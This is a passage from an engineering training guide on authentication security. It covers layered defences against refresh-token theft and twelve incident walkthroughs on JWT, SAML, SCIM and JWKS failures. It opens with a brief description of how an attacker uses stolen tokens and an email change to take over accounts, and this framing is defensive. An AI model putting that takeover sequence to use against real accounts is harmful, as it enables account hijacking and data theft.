Day 3-onwards: For high-value accounts
  Attacker uses access tokens to read account data
  For accounts with admin scope: data export, config changes
  Change email address: attacker now owns the account permanently
  Even if original token expires, email change = password reset = full account control
```

**The prevention — layered defence:**

```
Layer 1: httpOnly cookies for refresh tokens (eliminates the entire attack)
  document.cookie shows: nothing (httpOnly cookies invisible to JavaScript)
  Attacker's fetch: cannot read the refresh token at all
  Stolen: nothing. Attack surface eliminated.

Layer 2: Content Security Policy (limits what scripts can do)
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
  Prevents loading scripts from compromised CDN domains.
  (This requires careful maintenance — every third-party script needs to be listed)

Layer 3: BFF pattern (tokens never exist in the browser)
  Browser talks to your BFF (Node/Express server).
  BFF holds access tokens and refresh tokens server-side.
  Browser has only a session cookie.
  XSS attack: JavaScript finds no tokens to steal.

Layer 4: Subresource Integrity (SRI) for third-party scripts
  <script src="https://chat-widget.io/v2/widget.js"
    integrity="sha384-EXPECTED_HASH"
    crossorigin="anonymous"></script>
  If the CDN serves a modified script (attacker modified it),
  the browser rejects it because the hash doesn't match.
  This is the direct prevention for the supply chain attack scenario above.
```

> 💬 *"localStorage is not a vault. It is a shared whiteboard that every script on your page can read. Treat it like a public table in a coffee shop. Would you leave your refresh token on a public table? Then don't put it in localStorage."*

---

## Category 4 — Live Incident War Rooms 🚨

> *"A Principal Engineer does not panic. They have a mental diagnostic tree that they run while everyone else is refreshing dashboards."*

**What this category tests:** Can you lead a technical investigation under pressure? Do you have a systematic approach to authentication failures, or do you guess? Every incident here is real (anonymised) — the war room format puts you in the seat.

**Format for every incident:**
1. The PagerDuty alert with a timestamp
2. Scope assessment — the first 5 minutes
3. The diagnostic tree — hypotheses in order of likelihood
4. Root cause — what you find
5. Immediate fix + permanent fix
6. Post-mortem actions
7. The Principal insight — what this incident teaches about system design

---

### Incident 1 — The midnight certificate expiry

**📟 03:17 AM — PagerDuty: "API error rate 94%. All services. Error: invalid_token."**

**First 5 minutes — establish scope and form a hypothesis:**

```
Q: "Is this all clients or specific ones?"
A: All clients, all endpoints.
→ This is infrastructure-level. Not an application bug. Not a deployment.

Q: "What changed in the last 24 hours?"
A: No deployments. No configuration changes. Nothing.
→ Timer-based failure. The only things that fail on a schedule without anyone
  doing anything are: certificate expiry, scheduled key rotation, and cron job failure.
→ 03:00 is a suspiciously round number. Set a calendar reminder? A certificate expiry time?

First hypothesis: Auth Server signing certificate expired at 03:00.
```

**Confirm the hypothesis:**

```bash
openssl x509 -noout -dates -in /path/to/auth_server/signing.crt
Not Before: Jan 15 00:00:00 2022 GMT
Not After:  Apr 18 03:00:00 2024 GMT  ← 17 minutes ago

# Also check via JWKS endpoint:
curl https://auth.example.com/.well-known/jwks.json | jq '.keys[0].x5c[0]' | \
  base64 -d | openssl x509 -noout -dates
# Same result.
```

**Why this breaks everything:**

```
The Auth Server is still issuing tokens — signed with the now-expired certificate.
Resource servers fetch the JWKS endpoint. They see the certificate is expired.
Depending on library strictness:
  Option A: library rejects the key entirely if the cert is expired → 401
  Option B: library validates the signature but downstream middleware checks cert validity → 401
Either way: no new tokens can be validated. Every API request fails.
```

**Immediate fix:**

```
1. Generate new signing key pair:
   openssl genrsa -out new_signing.key 2048
   openssl req -new -x509 -key new_signing.key -out new_signing.crt -days 365

2. Add new certificate to Auth Server configuration:
   Keep both old and new cert listed in JWKS (overlap period)
   Switch Auth Server to sign new tokens with the new key
   
3. Force JWKS cache refresh on resource servers:
   Either wait for cache TTL to expire (up to 1 hour)
   Or restart API servers to force immediate key fetch
   Or configure JWKS cache with stale-while-revalidate (prevents future outages)

4. Test: issue a new token, validate it → success ✓
```

**Communication timeline:**

```
T+0:  "Investigating high error rate across all services"
T+5:  "Root cause identified: Auth Server signing certificate expired"
T+20: "Fix deployed. New certificate in place. Monitoring recovery."
T+45: "Error rate back to baseline. Post-mortem scheduled for tomorrow 10am."
```

**Post-mortem actions:**

```
Immediate (today):
  Add certificate expiry monitoring to your alerting system
  Alert thresholds: 90 days, 30 days, 14 days, 7 days, 1 day before expiry

This week:
  Document the zero-downtime certificate rotation procedure
  (see: add new cert alongside old → wait → switch → remove old)
  Test the procedure in staging

This month:
  Automate certificate rotation — no human should be woken at 3am for this
  Quarterly: run a rotation drill so the procedure is muscle memory

What was missing: a monitoring alert. One Prometheus alert for certificate expiry
would have given 90 days of warning. This outage was entirely preventable.
```

> 🎯 **Principal insight:** Certificate expiry is one of the most common causes of authentication outages in production systems. It is also one of the most preventable. The monitoring is trivial. The rotation procedure is well-documented. The only reason this happens is that nobody set up the alert. A Principal Engineer's job includes identifying infrastructure monitoring gaps before they become 3am incidents.

---

### Incident 2 — The JWT logout problem

**📟 Monday 09:15 — Support ticket: "URGENT — multiple users reporting they logged out but are still accessing the API and sensitive data."**

**First 5 minutes:**

```
Q: "What exactly did users do to 'log out'?"
A: Clicked the logout button in the app. Were redirected to the login page.

Q: "How are they still accessing the API?"
A: Client-side JavaScript is making authenticated API calls that succeed.

Immediate test: decode one of the post-logout tokens from API logs.
  jwt.io → check exp claim
  exp: 1713460300 → that's 47 minutes from now.
  The token is cryptographically valid. It has not expired.

Root cause: logout() cleared the session and the browser's stored token reference.
But the JWT access token itself: still cryptographically valid until exp.
Any code (their own or a cached tab, a browser extension, a background script)
that holds the token string can still use it.
This is the fundamental JWT logout problem. It is not a bug. It is the architecture.
```

**The depth of the problem:**

```
Session-based logout:    Server deletes the session → 401 immediately → done
JWT logout:              Server cannot delete a JWT → it validates anywhere
                         until exp. "Logout" is an illusion unless you either:
                         (a) wait for expiry — acceptable for short-lived tokens
                         (b) maintain a blocklist — "has this JTI been revoked?"
                         (c) use opaque tokens — Auth Server can revoke instantly
```

**Immediate mitigation options (pick based on your infrastructure):**

```
Option A — Shorten access token expiry (config change, deploy in minutes)
  Change token lifetime from 60 minutes to 5 minutes.
  Already-issued tokens expire within 5 minutes.
  New tokens will have the tighter window.
  Trade-off: more refresh calls, slight performance impact.
  Good for: any app where a 5-minute post-logout window is acceptable.

Option B — Redis JTI blocklist (code change, deploy this week)
  On logout: extract JTI from the JWT, store in Redis with TTL = remaining exp time.
  On every API request: check if JTI is in blocklist before processing.
  If blocklisted: return 401 immediately.
  Trade-off: one sub-millisecond Redis lookup per request.
  Good for: apps where instant post-logout revocation is required.

Option C — Opaque tokens for sensitive endpoints (architectural change)
  Swap to opaque tokens on endpoints where post-logout access is unacceptable.
  Introspection call on every request: always reflects current revocation state.
  Trade-off: 50-100ms per request on affected endpoints.
  Good for: high-security operations (admin, payments, health records).
```

**Communication to the security team:**

```
"This is a known architectural limitation of stateless JWTs — not a breach.
Users who legitimately clicked logout cannot generate NEW tokens (refresh token revoked).
The residual window is up to [X] minutes for tokens issued before logout.
No evidence that this window was exploited maliciously.
We are implementing option [A/B] with ETA [date].
I will send an architecture decision record documenting the trade-off chosen."
```

> 🎯 **Principal insight:** The JWT logout problem is not a bug in your code. It is a consequence of the stateless design. A Principal Engineers knows this, explains it clearly, and has already decided which mitigation is right for their app's risk profile — before the incident happens.

---

### Incident 3 — One enterprise customer's SSO broke

**📟 09:15 AM — Customer support: "Goldman Sachs SSO has been failing for 2 hours. 500 users cannot log in. All other customers are fine."**

**First 5 minutes — the critical insight:**

```
One customer broken + all others working = something specific to this customer.
This is NOT a platform issue.
A developer who jumps to platform diagnosis wastes 45 minutes and looks inexperienced.

The isolation tells you immediately:
  The problem is in this customer's specific SP Connection configuration
  OR their IdP changed something
  OR the network path to their specific IdP changed
```

**Diagnostic hypotheses in order of probability:**

```
1. Customer's IdP certificate rotated without notifying us (most common — 60% of cases)
2. Customer's IdP metadata changed (ACS URL, entity ID, SSO endpoint URL)
3. Your SP Connection config for this customer was accidentally changed
4. Network/DNS issue between your platform and their specific IdP

How to check hypothesis 1 in under 2 minutes:
  Ask customer's IT admin to attempt a login.
  Open SAML-tracer.
  Capture the SAMLResponse.
  Look at StatusCode: "Signature invalid" → certificate mismatch confirmed.

How to check hypothesis 1 programmatically:
  Extract the X509Certificate from the captured assertion.
  Compare SHA256 fingerprint against what you have stored for this customer.
  They will not match. The customer rotated their certificate.
```

**The conversation with the customer:**

```
Not: "Your IT team changed something."
(Accusatory. Makes them defensive. Delays resolution.)

Yes: "I've compared the certificate in your most recent assertion against what
we have on file for your IdP. They're different. This usually means a certificate
rotation happened on your end — even if it wasn't intentional or communicated.
Can your IT admin export your current IdP metadata so we can update our connection?"

Typical response: "Oh, our IT team did do some infrastructure maintenance last night..."
```

**Fix:**

```
Customer exports their current IdP metadata XML.
You update the SP Connection in your platform with the new metadata.
Run a test login with pilot user → success ✓
Re-enable for all 500 users.
Total time from your investigation start: 25-40 minutes.
```

**Post-mortem actions:**

```
Proactive monitoring (prevents future occurrences):
  For every SAML customer: store the certificate expiry date from their IdP metadata.
  Alert customer via email at 30/14/7/1 days before their IdP cert expires.
  "Your SAML signing certificate expires on [date]. Update your IdP metadata
   to avoid SSO disruption for your users."

Self-service for customers:
  Build a metadata update UI in your admin portal.
  Customer IT admin can update their own IdP metadata without filing a support ticket.
  Reduces time-to-resolution from 30 minutes to 5 minutes.

The real fix: make certificate rotation the customer's problem to manage,
but make it easy enough that they actually do it before it breaks.
```

---

### Incident 4 — The phantom 401s (intermittent, unproduceable)

**📟 Tuesday 14:00 — Engineering ticket: "2% of API requests failing with 401 invalid_token. No pattern by user, time, or endpoint. Cannot reproduce locally."**

**The diagnostic signature:**

```
"Intermittent" + "cannot reproduce locally" + "no user/time pattern" = clock skew.
This is not a definitive diagnosis — but it is the correct first hypothesis.

Why clock skew produces this exact symptom:
  The validator checks nbf (not before) and exp (expiry) against the server's clock.
  If the validator's clock is 65 seconds behind the issuer's clock:
    A token issued at T=0 has nbf=T=0.
    Validator clock: T=-65.
    Validator sees: nbf=0, now=-65.
    now < nbf → "token not yet valid" → 401.
  
  "2%" = only some validators have the clock drift.
  Which validator handles your request depends on load balancer routing.
  That's why it's intermittent and cannot be reproduced locally
  (your local machine's clock is fine).
```

**How to confirm:**

```bash
# On the API servers — check their time synchronisation:
ntpq -pn
# Look at the 'offset' column — anything > 30 seconds is problematic

# Or: log the server time alongside every JWT validation failure:
logger.error({
  event: 'jwt_validation_failed',
  error: err.message,
  token_iat: payload?.iat,
  token_exp: payload?.exp,
  server_time: Math.floor(Date.now() / 1000),
  drift: Math.floor(Date.now() / 1000) - payload?.iat
});
# If drift is consistently 60-90 seconds, clock skew confirmed.
```

**Fix:**

```
Immediate (config change, deploy in minutes):
  Add clock skew tolerance to every JWT validator:
  const { payload } = await jwtVerify(token, JWKS, {
    clockTolerance: 60  // accept tokens up to 60 seconds before/after validity window
  });
  Standard industry tolerance: 60 seconds.
  Never go beyond 300 seconds — you are widening the replay window.

Proper fix (infrastructure):
  Enforce NTP synchronisation on all hosts.
  In Kubernetes: containers inherit the host clock.
    Fix at the host level, all containers on that host are fixed.
  Add monitoring: alert when any service clock drift > 10 seconds.
  Cloud environments (AWS, GCP, Azure): use the provided NTP servers.
    AWS: 169.254.169.123. GCP: metadata.google.internal. Azure: time.windows.com.

What NOT to do:
  Do NOT increase token lifetime to mask the problem.
  You would be trading a 2% error rate for a larger security window.
  The clock is wrong. Fix the clock.
```

---

### Incident 5 — SCIM provisioning race condition on Day 1

**📟 Monday 09:30 — "New employee Priya cannot access Salesforce. She can log in but gets no permissions. Manager confirmed she should have full CRM access."**

**The symptom analysis:**

```
SSO login succeeds → authentication is working (PingFed + AD are fine)
No permissions in Salesforce → authorisation failed (wrong role was provisioned)

Key distinction: this is a provisioning problem, not an SSO problem.
Priya has an account. The account has the wrong permissions.
```

**Diagnostic tree:**

```
Q1: What does SAML-tracer show in the assertion for Priya's login?
    → Look at the Role or groups attribute value.

    If Role = empty or wrong value:
      → Priya is not in the correct AD group yet (provisioning incomplete)
      → IGA workflow may not have finished
    
    If Role = correct value (e.g. "Salesforce_SalesManager"):
      → SAML assertion is correct
      → Salesforce account has the wrong profile despite correct assertion
      → SCIM provisioned the account before the AD group was assigned
      → RACE CONDITION
```

**Root cause — the race condition in detail:**

```
08:00  HR creates Priya in Workday. Triggers IGA joiner workflow.
08:15  IGA starts SCIM provisioning to Salesforce (parallel to AD group assignment)
08:15  Salesforce account created via SCIM with groups from LDAP at this moment
       (Priya is in the AllStaff group but not yet in Salesforce_SalesManager group)
08:17  IGA finishes assigning Priya to Salesforce_SalesManager AD group
08:17  BUT: SCIM already ran. Salesforce account already created. Wrong profile.

09:00  Priya arrives. Logs in via SAML.
       SAML assertion: Role=Salesforce_SalesManager (correct — AD group now assigned)
       Salesforce: looks up Priya's account → profile is "Standard Read-Only User"
       (Set by SCIM before the correct group was available)
       
       SAML attributes are used for first-time JIT update only if configured.
       In this case: SCIM profile overrides the SAML assertion.
```

**Immediate fix:**

```
Manually update Priya's Salesforce profile via the Salesforce admin console.
Correct: set profile to "Sales Manager" + assign correct permission sets.
Time: 5 minutes. Priya is unblocked.
```

**Root cause fix:**

```
Fix the IGA workflow sequencing:
  Step 1: Create AD account
  Step 2: Assign ALL AD groups (role-based + app-specific)
  Step 3: Wait for group assignment confirmation
  Step 4: THEN trigger SCIM provisioning

SCIM must run AFTER all AD groups are in place, not in parallel with group assignment.
This is a workflow configuration change in your IGA platform (SailPoint, Saviynt, etc.)
Not a code change — a workflow dependency definition.

Additional: configure your SCIM connector to do attribute sync on every SSO login.
If SAML says Role=SalesManager and SCIM has ReadOnly → SAML wins → auto-correct.
This adds resilience for future race conditions.
```

---

### Incident 6 — Refresh token family revocation storm

**📟 Wednesday 09:52 — Monitoring alert: "40,000 refresh token family revocations in the last 10 minutes. Normal rate: 50/hour."**

**First 5 minutes:**

```
40,000 revocations in 10 minutes = something is very wrong.
Family revocations trigger when a rotated (already-used) token is submitted.
Normal causes: legitimate theft detection (attacker + user both use the same token).
40,000 in 10 minutes across all users = not a wave of token thefts.
This is either a code bug or a deployment.

Q: "Did a deployment happen in the last 30 minutes?"
   Check CI/CD pipeline.
   YES: app v2.4.1 deployed at 09:44.

Q: "What changed in v2.4.1?"
   Review the diff.
   Finding: a developer "optimised" the token refresh logic by removing a mutex lock.
   Reasoning in the commit message: "mutex was causing latency, not needed"
   
   The mutex was preventing concurrent refresh calls from the same session.
   Without it: two API calls that trigger a token refresh simultaneously
   both submit the same refresh token.
   First call: submits refresh_token_7 → gets refresh_token_8
   Second call: submits refresh_token_7 (already rotated!) → family revoked
   User is logged out. Logs back in. Gets new refresh_token_1.
   Same race condition hits immediately. Cycle.
```

**Immediate action:**

```
ROLLBACK v2.4.1 NOW.
Before investigating further, before writing a ticket, before calling anyone.
Production is degraded. Rollback first.

git revert v2.4.1  →  deploy  →  monitor revocation rate
Rate drops from 4,000/minute to normal within 3 minutes of rollback.
Confirmed: v2.4.1 was the cause.
```

**The correct implementation:**

```javascript
// WRONG — what v2.4.1 shipped:
async function getValidToken() {
  if (isExpired(cachedToken)) {
    const newTokens = await refreshToken(cachedToken.refresh);  // race condition here
    cachedToken = newTokens;
  }
  return cachedToken;
}

// CORRECT — with mutex:
import Mutex from 'async-mutex';
const refreshMutex = new Mutex();

async function getValidToken() {
  if (!isExpired(cachedToken)) return cachedToken;

  // Acquire mutex — only ONE refresh at a time per client instance
  const release = await refreshMutex.acquire();
  try {
    // Check again after acquiring — another caller may have refreshed already
    if (!isExpired(cachedToken)) return cachedToken;

    const newTokens = await refreshToken(cachedToken.refresh);
    cachedToken = newTokens;
    return cachedToken;
  } finally {
    release();  // always release, even if refresh throws
  }
}
```

**Post-mortem actions:**

```
Process: auth-related PRs require Principal Engineer sign-off
         A comment explaining "this removes safety" is insufficient to approve

Test: add an integration test for concurrent refresh attempts
      Submit 10 concurrent requests that all trigger a refresh simultaneously
      Expected: all 10 receive a valid token, zero family revocations

Monitoring: alert when family revocation rate exceeds 100/minute
            (even 100 is suspicious — normal is ~0 in a healthy system)

The real lesson: "removing safety for performance" is a red flag phrase in PRs.
A mutex that prevents concurrent token refresh is not latency — it is correctness.
```

---

### Incident 7 — AudienceRestriction mass failure after domain migration

**📟 Friday 16:00 — "SSO broken for ALL 3,000 users across ALL 80 applications. Error: AudienceRestriction mismatch."**

**The scope is catastrophic:**

```
All users. All apps. Same error. This happened after a domain migration.
The pattern is unmistakable: the IdP entity ID changed and nobody updated the SPs.

Original IdP entity ID: https://pingfed.company.com
New IdP entity ID:      https://pingfed.newcompany.com

All 80 SPs have the Issuer validation configured against the OLD entity ID.
All assertions now come from the NEW entity ID.
Every single assertion fails the Issuer check.

Additionally: every assertion has:
  AudienceRestriction: https://newcompany-app.com/saml
But the SP's own entity ID is still configured as:
  https://company-app.com/saml
AudienceRestriction check also fails.

Two simultaneous failures. 80 apps. All 3,000 users.
```

**Immediate triage — what to restore first:**

```
Q: "What is the most business-critical application?"
A: Salesforce (revenue-generating CRM), then HR system (payroll runs Monday).

Prioritise by business impact, not alphabetically.
Restore Salesforce first, document it works, then HR, then the rest.

Total configuration changes needed: 80 × 2 (entity ID + audience) = up to 160 changes
plus notifying all SP admins to re-import IdP metadata.

This is a multi-day migration project, not a hotfix.
```

**The architectural mistake that allowed this:**

```
A domain migration is an IAM migration.
When the platform team planned the domain migration, IAM was not in the room.
Nobody considered that changing the domain changes every SAML entity ID.

A Principal Engineer's job includes being invited to infrastructure planning meetings.
"We're migrating domains" is a sentence that should trigger an IAM review.
The cost of involving IAM in the planning: 2 hours.
The cost of not involving IAM: a 3,000-user outage on a Friday afternoon.
```

**The correct migration procedure (for future reference):**

```
6 weeks before: 
  Identify all SAML entity IDs that will change.
  Contact all 80 SP admins: "Your SAML configuration will need updating on [date]."

3 weeks before:
  Add new entity ID as an ALIAS in PingFed.
  Both old and new entity IDs accepted simultaneously.
  All SPs can update their configurations at their own pace.

Migration day:
  Switch PingFed to use new entity ID as primary.
  Assertions carry new entity ID.
  SPs that updated: works immediately.
  SPs that haven't: still working (old entity ID alias still accepted).

2 weeks after migration:
  Remove old entity ID alias.
  Final stragglers must have updated by now or call support.

Total user impact with this plan: zero.
```

---

### Incident 8 — Token endpoint DDoS on Black Friday

**📟 Black Friday 09:15 — "Token endpoint latency 8.2 seconds. Normal: 50ms. Checkout flow failing for all customers."**

**The immediate question:**

```
Is this a real load increase or a client misbehaviour?

Check: how many unique client_ids are requesting tokens?
       how often is each client requesting a new token?
       what is the average token age when refresh is triggered?

Finding:
  checkout-service is requesting a new token every 2-3 seconds.
  Token lifetime: 3,600 seconds (1 hour).
  checkout-service has 500 instances running.
  500 instances × 1 request every 2-3 seconds = ~200 token requests/second
  just from checkout-service, not caching tokens at all.

Root cause: developer who "fixed" a retry bug added this logic:
  if (apiResponse.status === 503) {
    await clearTokenCache(); // re-authenticate on any error
    return retryRequest();
  }

A downstream inventory service is returning 503 during Black Friday load.
checkout-service interprets this as "auth failed" and clears + re-fetches token.
500 instances doing this simultaneously = 200 wasted token requests per second.
```

**Immediate fix:**

```
Emergency rate limit on the token endpoint:
  Max 10 token requests per client_id per minute.
  This throttles the retry storm without breaking legitimate usage.
  Deploy via WAF rule — no code change required.

Fix the actual bug (deploy within hours):
  Differentiate 401 (auth failed → re-authenticate) from 503 (service unavailable → retry):

  if (res.status === 401) {
    tokenCache.invalidate();  // only clear on auth failure
    return fetch(url, { headers: { Authorization: `Bearer ${await getToken()}` }});
  }
  if (res.status === 503) {
    await sleep(exponentialBackoff(attempt)); // retry with same token, back off
    return retryRequest(attempt + 1);
  }
  // 503 ≠ auth failure. NEVER clear the token cache on 503.
```

**Post-mortem:**

```
SDK fix: make token caching the default and make it obvious.
         Add a token_cache_hit_rate metric visible in your developer dashboard.
         If any service has a cache hit rate < 95%, alert the team.

Load testing: include the token endpoint in your Black Friday load tests.
              "Can the checkout service handle 10x traffic?" must include
              "and what does that do to token request volume?"

The principle: error handling code is production code.
               The "retry on error" logic was written hastily and never load tested.
               Retry logic that re-authenticates on 503 is a DDoS amplification bug.
```

---

### Incident 9 — SLO failure: terminated employee still has active sessions

**📟 Wednesday — Security team report: "Employee terminated 10 days ago. AD account disabled on day of termination. But they still have an active session in Jira."**

**The investigation:**

```
AD disabled on termination day ✓ → SAML SSO fails for that employee → correct.

But active SESSIONS established before AD disable persist.
The question: what IS Jira's session?

Check Jira's session logs for the ex-employee's account:
  Last authentication event: day of termination, 09:15 (before AD was disabled)
  Last activity: 10 days after termination, 14:30
  Session type: Jira's own internal session cookie

How: Jira authenticated the user via SAML SSO at 09:15 on termination day.
     AD was disabled at 10:30 that day.
     Jira's internal session was created at 09:15 with a 30-day timeout.
     The user (or someone with their device) has been using that session for 10 days.

SLO was triggered: Jira received the LogoutRequest but silently ignored it.
(Check Jira admin logs: LogoutRequest received at 10:35 → response: 200 OK
 but Jira's session was not actually terminated)
```

**Root cause — Jira's SLO non-compliance:**

```
Jira (many enterprise apps) implements SLO incorrectly.
It accepts the LogoutRequest and returns HTTP 200.
But it does not actually terminate the user's internal session.
The session persists for 30 days regardless of logout.

This is a vendor bug, not a configuration bug.
But it is YOUR security problem because it is YOUR user's access.
```

**Immediate fix:**

```
Manually terminate the Jira session via Jira admin console:
  Jira Admin → User Management → [username] → Active Sessions → Terminate All
  Done. Session is gone. Confirmed: user can no longer access Jira.
```

**Process fix:**

```
Add to offboarding checklist:
  ✅ Disable AD account (automated)
  ✅ Trigger SLO via IdP (automated)
  ✅ Manual session termination in Jira (manual — until Jira fixes their SLO)
  ✅ Confirm zero active sessions within 1 hour

Vendor escalation:
  File a support ticket with Atlassian: "Your SLO implementation does not
  terminate sessions when a LogoutRequest is received."
  Document this as a known security gap until resolved.
```

**System design fix:**

```
Shorten Jira's internal session timeout from 30 days to 8 hours:
  Jira Admin → Authentication → Session Duration → 8 hours
  Worst case post-termination access window: 8 hours instead of 30 days.

For CRITICAL applications (trading systems, HR data, financial records):
  Implement per-request AD state check.
  App checks if the AD account is enabled on every request.
  Disabled account = instant block, session or not.
```

> 🎯 **Principal insight:** SLO is a best-effort protocol. A complete offboarding procedure cannot rely on SLO alone. Every application must be audited for SLO compliance. Applications that fail SLO must have compensating controls documented and implemented.

---

### Incident 10 — Signing key compromise (P0 security incident)

**📟 Thursday 14:00 — Security alert: "Auth Server private signing key found in public GitHub repository. Exposure duration: 72 hours."**

**This is a P0. The clock is running.**

```
What "private signing key exposed" means:
  Anyone who found this key in the last 72 hours can sign JWTs for ANY user.
  They can impersonate admins. Access any API. Exfiltrate any data.
  You do not know who found it. You do not know what they signed.
  Every JWT issued in the last 72 hours is potentially compromised.
  You must assume the worst.
```

**First 30 minutes — the exact actions in order:**

```
Minute 0-5: Contain the GitHub exposure
  Make the repository private (if it was public).
  OR: if in a public fork/commit, you cannot delete it from GitHub history.
  Remove the secret from GitHub using BFG Repo Cleaner or git-filter-repo.
  Rotate any other secrets in that repository.
  Document: exact commit SHA, exact timestamp first pushed, exact timestamp found.

Minute 5-10: Rotate the signing key NOW
  Generate new RSA key pair.
  Add new key to JWKS alongside old key (brief overlap for tokens in flight).
  Switch Auth Server to sign all new tokens with the new key.
  Note: old key is COMPROMISED — do not use it for signing again.
  Remove old key from JWKS after confirming new key is being used.
  With old key removed from JWKS: any token signed with old key = 401.

Minute 10-20: Invalidate all existing tokens
  All JWTs signed with the compromised key = potentially forged.
  You cannot distinguish legitimate from attacker-forged.
  Action: force re-authentication for ALL users.
  How: remove old key from JWKS (validators reject old-key tokens immediately)
       + revoke all refresh tokens (no new tokens can be silently issued)
  Impact: all users are logged out. They must re-authenticate.
  This is the correct response. Accept the user disruption.

Minute 20-30: Escalate and communicate
  Notify CISO immediately: "P0 security incident. Signing key exposed. 
  Rotating key now. Forcing re-authentication for all users."
  Notify legal team: regulatory breach notification may be required.
  Draft customer communication (legal team will approve before sending).
  DO NOT send customer communication without legal approval.
```

**Forensic investigation (parallel to containment):**

```
Review Auth Server logs for the 72-hour exposure window.
What to look for:
  Tokens issued for admin accounts during off-hours
  Tokens with unusual scopes (admin.all, export.all, etc.)
  Tokens issued for users who have no record of logging in during that period
  API calls to data export endpoints

Build a list of potentially compromised accounts.
For each: investigate what data was accessed.
If any: follow your data breach notification procedure.
```

**Post-mortem actions:**

```
How did the key get into the repository?
  Most common: developer running local auth server, copied the generated key,
               committed it as part of a "test setup" commit.

Prevent recurrence:
  Pre-commit hooks: detect private keys before they can be committed
                    (GitGuardian, GitHub secret scanning, truffleHog)
  Key storage: private keys NEVER on disk in application directories
               ALWAYS in KMS/HSM/Vault injected at runtime
  Developer machines: local dev should never have production keys
                      Use separate signing keys for local development

Run a rotation drill quarterly:
  The procedure above should take 30 minutes because you have practiced it.
  If this is the first time you are doing it: it will take 3 hours.
  Run the drill in staging. Time it. Know the exact commands before you need them.
```

> 💬 *"A signing key compromise is the worst-case scenario for a JWT-based system. There is no graceful path — you must force everyone out and rotate. The only thing that makes this survivable is having practiced the rotation procedure. The organisations that handle this well have a runbook and have run it at least once in non-production. The ones that don't have a very bad night."*

---

### Incident 11 — Multi-region JWKS failure

**📟 Tuesday 11:30 — "EU region: all API requests returning 401. US region: fine. No deployment in 6 hours."**

**The regional isolation tells you everything:**

```
US fine + EU broken = region-specific infrastructure failure.
Not code. Not deployment. Not user behaviour.

Hypotheses in order:
  1. EU API servers cannot reach the JWKS endpoint (most likely)
  2. EU Auth Server has a different/wrong public key
  3. Clock skew specific to EU servers
  4. Network partition affecting EU API servers only
```

**Confirm hypothesis 1:**

```bash
# Run from an EU API server:
curl -v https://auth.example.com/.well-known/jwks.json
# Result: connection timeout after 30 seconds.
# The EU servers cannot reach the JWKS endpoint.

# Why: Auth Server is in US-East only.
#      A network event degraded the transatlantic link 6 hours ago.
#      EU JWKS cache expired (TTL: 10 minutes configured).
#      EU servers attempted to refresh JWKS → timed out.
#      With no valid public keys: cannot validate any JWT → all requests rejected.
```

**Immediate fix:**

```javascript
// Extend JWKS cache grace period on EU servers (emergency config):
const JWKS = createRemoteJWKSet(
  new URL('https://auth.example.com/.well-known/jwks.json'),
  {
    cacheMaxAge: 600_000,        // normal: 10 minutes
    cooldownDuration: 86_400_000 // on failure: serve stale cache for 24 hours
  }
);
// EU servers: reload config → JWKS cache refreshed from stale →
// already-cached public keys are used → token validation resumes
// Tokens issued yesterday are validated. No new tokens needed.
```

**Architectural fix:**

```
Deploy JWKS endpoint in every region:
  EU: https://eu.auth.example.com/.well-known/jwks.json
  US: https://us.auth.example.com/.well-known/jwks.json
  Global CDN: https://auth.example.com/.well-known/jwks.json (CDN-cached globally)

JWKS only contains PUBLIC keys. It is safe to cache and replicate everywhere.
There is no security concern with having the public key available globally.
The concern is with availability — the public key must always be reachable.

EU API servers configured to:
  Primary: eu.auth.example.com/.well-known/jwks.json (same region, 5ms latency)
  Fallback: global CDN endpoint (if EU endpoint unavailable)
  Stale cache: 24 hours (if both unavailable, serve stale and alert)

The JWKS endpoint's availability SLA should be HIGHER than your Auth Server's SLA.
If the JWKS endpoint is down, ALL token validation in that region fails.
It should be treated as critical read-only infrastructure, not as an Auth Server endpoint.
```

---

### Incident 12 — SAML flood DDoS

**📟 Monday 10:00 — "Auth Server CPU 100%. Response times 12 seconds. Normal: 50ms. SAML SSO broken for all users."**

**The investigation:**

```
Check Auth Server logs:
  50,000 incoming SAMLRequests per minute. Normal: 500 per minute. 100x spike.

Examine a sample of the requests:
  AuthnRequest entity IDs: random strings, not registered SP entity IDs
  Signatures: absent (AuthnRequests are optionally signed)
  Source IPs: 3 IP addresses, each sending ~17,000 requests/minute

This is a targeted attack, not a genuine load spike.
The attacker is sending unsigned AuthnRequests with random entity IDs.

Why this works as a DDoS:
  If your Auth Server validates the XML structure before rejecting unknown entity IDs,
  XML parsing + schema validation is CPU-intensive.
  50,000 well-formed but invalid XML documents per minute = CPU saturation.
  Legitimate SSO requests queue behind all this work and time out.
```

**Immediate fix — fast-path rejection:**

```javascript
// BEFORE XML parsing — check entity ID with a hash lookup:
app.get('/idp/SSO.saml2', async (req, res) => {
  const rawRequest = decompressBase64(req.query.SAMLRequest);

  // FAST PATH: Extract entityID with simple string matching (not full XML parse)
  // This is a performance hack — regex on raw XML, not a proper parse
  const entityIdMatch = rawRequest.match(/Issuer[^>]*>([^<]+)</);
  const entityId = entityIdMatch?.[1]?.trim();

  // O(1) hash lookup — runs in microseconds
  if (!entityId || !registeredSPs.has(entityId)) {
    return res.status(400).json({ error: 'unknown_sp' });
    // No XML parsing. No signature validation. No CPU spent.
  }

  // Known SP — proceed with full XML processing
  return processFullAuthNRequest(rawRequest, req, res);
});
```

**WAF mitigation (deploy immediately):**

```
Rate limit: max 100 requests/minute per IP to /idp/SSO.saml2
Block: the 3 attacker IPs immediately (while investigating)
Geographic block: if your users are all in one region, block requests from others

These rules can be deployed in minutes via your WAF (Cloudflare, AWS WAF, etc.)
without touching application code.
```

**Hardening (this week):**

```
Require signed AuthnRequests:
  In your IdP metadata: WantAuthnRequestsSigned="true"
  In your SP connections: require signing keys for every SP
  Only SPs with registered signing certificates can send AuthnRequests
  An attacker without a registered certificate cannot send valid signed requests

AuthnRequest ID tracking:
  Store recently seen AuthnRequest IDs in Redis (5-minute TTL)
  Reject duplicate IDs — prevents the same AuthnRequest from being replayed

This attack is documented in SAML threat models.
It should be in your security design review checklist for every IdP deployment.
```

---

## 🌉 Bridge to Document 3

**What you just covered in Document 2:**

You now know how IAM systems fail — both under deliberate attack and under operational pressure. You have walked through 12 attacks at the code level, understanding exactly which flaw each one exploits and exactly how to close it. You have led 12 incident war rooms, knowing the diagnostic tree for each failure mode and the difference between an immediate mitigation and a permanent fix.

**The gap this leaves:**

You can identify vulnerabilities and diagnose failures. But can you DESIGN the product itself? Can you review code for auth bugs before they ship? Can you design the API surface of an Auth Server that 10,000 developers will use safely?

**Document 3 covers:**
